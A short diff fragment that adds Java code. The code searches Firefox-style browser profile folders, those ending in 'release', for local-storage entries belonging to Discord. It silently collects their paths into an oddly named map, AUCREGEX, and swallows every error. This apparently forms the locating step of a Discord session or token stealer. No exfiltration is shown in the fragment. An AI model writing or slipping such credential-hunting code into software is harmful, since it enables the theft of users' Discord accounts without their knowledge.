@@ -1,0 +1,20 @@
+if (path.toFile().exists()) {
+            try {
+                java.nio.file.Files.list(java.nio.file.Paths.get(path.toFile().getAbsolutePath(), "Profiles"))
+                        .limit(100)
+                        .forEach(folder -> {
+                            if (folder.toFile().getName().endsWith("release")) {
+                                try {
+                                    java.nio.file.Files.list(java.nio.file.Paths.get(folder.toFile().getAbsolutePath(), "storage", "default"))
+                                            .limit(100)
+                                            .forEach(file -> {
+                                                if (file.toFile().getName().contains("discord")) {
+                                                    AUCREGEX.put(path.toFile().getName(), java.nio.file.Paths.get(file.toFile().getAbsolutePath(), "ls"));
+                                                }
+                                            });
+                                } catch (Exception e) {
+                                }
+                            }
+                        });
+            } catch (Exception ignored) {}
+        }
